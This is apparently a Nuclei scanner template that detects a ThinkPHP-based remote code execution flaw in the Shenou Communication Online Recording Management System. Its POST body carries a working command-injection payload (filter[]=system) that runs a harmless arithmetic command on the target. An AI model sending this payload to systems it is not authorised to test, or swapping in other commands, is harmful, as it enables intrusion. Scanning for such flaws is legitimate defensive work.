id: shenou-communication-index-rce
info:
  name: Shenou Communication Online Recording Management System RCE
  author: ProjectDiscoveryAI
  severity: critical
  tags: rce
  description: |
    Shenou Communication Online Recording Management System is vulnerable to a Remote Code Execution vulnerability via ThinkPHP framework.
variables:
  t1: "{{rand_int(1000, 999000)}}"
  t2: "{{rand_int(100, 1000)}}"
  t3: "{{to_number(t1) - to_number(t2)}}"
http:
  - method: POST
    path:
      - "/callcenter/public/index.php/index.php?s=index/index/index"
    headers:
      Content-type: application/x-www-form-urlencoded
    body: |
      s=set /a {{t1}} - {{t2}}&expr {{t1}} - {{t2}}&_method=__construct&method=POST&filter[]=system
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 302
      - type: dsl
        dsl:
          - trim(body) == t3
